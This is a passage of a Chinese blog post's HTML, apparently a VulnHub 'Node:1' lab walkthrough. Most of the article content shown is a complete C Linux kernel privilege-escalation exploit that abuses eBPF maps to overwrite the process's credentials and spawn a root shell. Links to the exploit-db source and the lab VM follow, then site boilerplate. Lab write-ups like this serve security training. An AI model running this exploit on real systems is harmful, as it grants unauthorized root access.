class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line">        <span class="string">"\x62\x0a\xfc\xff\x02\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x79\x08\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\xbf\x02\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x55\x06\x03\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x79\x73\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x7b\x32\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x55\x06\x02\x00\x01\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x7b\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x7b\x87\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">        .prog_type = prog_type,</span><br><span class="line">        .insns = (__u64)insns,</span><br><span class="line">        .insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">        .license = (__u64)license,</span><br><span class="line">        .log_buf = (__u64)bpf_log_buf,</span><br><span class="line">        .log_size = LOG_BUF_SIZE,</span><br><span class="line">        .log_level = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    attr.kern_version = kern_version;</span><br><span class="line"> </span><br><span class="line">    bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">int</span> max_entries)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">        .map_type = map_type,</span><br><span class="line">        .key_size = key_size,</span><br><span class="line">        .value_size = value_size,</span><br><span class="line">        .max_entries = max_entries</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">        .map_fd = mapfd,</span><br><span class="line">        .key = (__u64)&amp;key,</span><br><span class="line">        .value = (__u64)&amp;value,</span><br><span class="line">        .flags = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">        .map_fd = mapfd,</span><br><span class="line">        .key = (__u64)key,</span><br><span class="line">        .value = (__u64)value,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line"> </span><br><span class="line">    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            (struct bpf_insn *)__prog, PROGSIZE, <span class="string">"GPL"</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"write"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"short write: %lu\n"</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line">    bpf_update_elem(<span class="number">0</span>, (a)); \</span><br><span class="line">    bpf_update_elem(<span class="number">1</span>, (b)); \</span><br><span class="line">    bpf_update_elem(<span class="number">2</span>, (c)); \</span><br><span class="line">    writemsg();</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64_t <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> value;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>) &#123;</span><br><span class="line">    __update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr) &#123;</span><br><span class="line">    __update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val) &#123;</span><br><span class="line">    __update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64_t <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"> </span><br><span class="line">    fp = __get_fp();</span><br><span class="line">    <span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">"bogus fp"</span>);</span><br><span class="line">     </span><br><span class="line">    sp = get_sp(fp);</span><br><span class="line">    <span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">"bogus sp"</span>);</span><br><span class="line">     </span><br><span class="line">    task_struct = __read(sp);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">"bogus task ptr"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"task_struct = %lx\n"</span>, task_struct);</span><br><span class="line"> </span><br><span class="line">    credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">"bogus cred ptr"</span>);</span><br><span class="line"> </span><br><span class="line">    uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line">    <span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">"bogus uid ptr"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uidptr = %lx\n"</span>, uidptr);</span><br><span class="line">    __write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"spawning root shell\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    __exit(<span class="string">"not vulnerable?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    prep();</span><br><span class="line">    pwn();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="扩展链接"><a href="#扩展链接" class="headerlink" title="扩展链接"></a>扩展链接</h2><p>Boot2root挑战github链接：<a href="https://github.com/topics/boot2root" target="_blank" rel="noopener">https://github.com/topics/boot2root</a><br>虚拟机下载：<a href="https://www.vulnhub.com/entry/node-1,252/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/node-1,252/</a><br>exploit源码：<a href="https://www.exploit-db.com/exploits/44298/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44298/</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="http://wang66.top">王六六</a>
+            </p><p>原文链接: <a href="http://wang66.top/2018/vulnhub-node1.html">http://wang66.top/2018/vulnhub-node1.html</a>
+            </p><p>发表日期: <a href="http://wang66.top/2018/vulnhub-node1.html">September 30th 2018, 3:55:15 pm</a>
+            </p><p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/vulnhub-wankada1.html" title="Vulnhub渗透笔记之wankanda1">
+                    <div class="nextTitle">Vulnhub渗透笔记之wankanda1</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/The-mathematics-of-cryptography.html" title="浅谈密码学中的数学基础">
+                    <div class="prevTitle">浅谈密码学中的数学基础</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+    <div id="comment"></div>
+    <script>
+    new Valine({
+        el: '#comment' ,
+        notify: "true", 
+        verify: false, 
+        appId: "kBws43cqYyOkzvJkwd7PwiQ3-gzGzoHsz",
+        appKey: "IEbfjsLgEhcgfFfWicWSYdhf",
+        placeholder: "来评论一下吧~",
+        path:window.location.pathname, 
+		avatar: 'robohash' // (''/mp/identicon/monsterid/wavatar/robohash/retro/hide)
+    });
+    </script>
+
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:wangji19971013@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/wang66just6" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/wechat.png">
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title="qq">
+                  
+                  <img class="profile-qr" src="/assets/qq.jpg">
+                </span>
+            
+        
+    
+        
+            
+                <a href="//weibo.com/wang66just6" class="iconfont-archer weibo" target="_blank" title="weibo"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/wang66just6" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span><br>
+		<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+		<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+	<script>
+		var now = new Date(); 
+		function createtime() { 
+			var grt= new Date("08/01/2018 12:00:00");//此处修改你的建站时间或者网站上线时间 
+			now.setTime(now.getTime()+250); 
+			days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+			hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+			if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+			mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+			seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+			snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+			document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+			document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+		} 
+	setInterval("createtime()",250);
+	</script>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-1"><span class="toc-number">1.</span> <span class="toc-text">Node:1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境配置"><span class="toc-number">2.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell"><span class="toc-number">4.</span> <span class="toc-text">Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#破解"><span class="toc-number">5.</span> <span class="toc-text">破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具"><span class="toc-number">7.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit详情"><span class="toc-number">8.</span> <span class="toc-text">exploit详情</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#扩展链接"><span class="toc-number">9.</span> <span class="toc-text">扩展链接</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 19
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href="/2020/ELF-formt.html">ELF文件格式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/2020/How-The-Kernel-Manages-Your-Memory.html">How The Kernel Manages Your Memory</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/Anatomy-of-a-Program-in-Memory.html">Anatomy of a Program in Memory</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/2019/port-knocking.html">端口敲门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href="/2019/Information-collection.html">信息收集总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/02</span><a class="archive-post-title" href="/2019/powershell-attack.html">PowerShell攻击技术</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span><a class="archive-post-title" href="/2018/vulnhub-ch4inrulz1-0-1.html">Vulnhub渗透笔记之ch4inrulz:1.0.1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href="/2018/vulnhub-lampiao1.html">VulnHub渗透笔记之Lampio1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href="/2018/vulnhub-wankada1.html">Vulnhub渗透笔记之wankanda1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/30</span><a class="archive-post-title" href="/2018/vulnhub-node1.html">Vulnhub渗透笔记之Node:1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href="/2018/The-mathematics-of-cryptography.html">浅谈密码学中的数学基础</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href="/2018/linux-rookit.html">Linux后门检测与系统恢复</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href="/2018/HistoryofMCD.html">恶意代码发展简史</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/2018/soyouwantobeahacker.html">所以你想成为黑客？</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href="/2018/website-attack.html">社会工程学攻击之网站钓鱼</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href="/2018/隐写术之LSB隐写.html">隐写术之LSB隐写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href="/2018/一次恶意PHP脚本初探.html">一次恶意PHP脚本初探</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href="/2018/ARP毒化.html">来自身边的安全威胁—ARP欺骗攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href="/2018/浅析缓冲区溢出.html">浅析缓冲区溢出</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="局域网"><span class="iconfont-archer">&#xe606;</span>局域网</span>
+    
+        <span class="sidebar-tag-name" data-tags="arp"><span class="iconfont-archer">&#xe606;</span>arp</span>
+    
+        <span class="sidebar-tag-name" data-tags="中间人攻击"><span class="iconfont-archer">&#xe606;</span>中间人攻击</span>
+    
+        <span class="sidebar-tag-name" data-tags="系统原理"><span class="iconfont-archer">&#xe606;</span>系统原理</span>
+    
+        <span class="sidebar-tag-name" data-tags="翻译"><span class="iconfont-archer">&#xe606;</span>翻译</span>
+    
+        <span class="sidebar-tag-name" data-tags="恶意代码"><span class="iconfont-archer">&#xe606;</span>恶意代码</span>
+    
+        <span class="sidebar-tag-name" data-tags="计算机病毒"><span class="iconfont-archer">&#xe606;</span>计算机病毒</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="vulnhub"><span class="iconfont-archer">&#xe606;</span>vulnhub</span>
+    
+        <span class="sidebar-tag-name" data-tags="密码学"><span class="iconfont-archer">&#xe606;</span>密码学</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="rootkit"><span class="iconfont-archer">&#xe606;</span>rootkit</span>
+    
+        <span class="sidebar-tag-name" data-tags="powershell"><span class="iconfont-archer">&#xe606;</span>powershell</span>
+    
+        <span class="sidebar-tag-name" data-tags="资源，翻译"><span class="iconfont-archer">&#xe606;</span>资源，翻译</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
+    
+        <span class="sidebar-tag-name" data-tags="社会工程学"><span class="iconfont-archer">&#xe606;</span>社会工程学</span>
+    
+        <span class="sidebar-tag-name" data-tags="隐写术"><span class="iconfont-archer">&#xe606;</span>隐写术</span>
+    
+        <span class="sidebar-tag-name" data-tags="lsb隐写"><span class="iconfont-archer">&#xe606;</span>lsb隐写</span>
+    
+        <span class="sidebar-tag-name" data-tags="缓冲区"><span class="iconfont-archer">&#xe606;</span>缓冲区</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="资源"><span class="iconfont-archer">&#xe60a;</span>资源</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "王六六"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
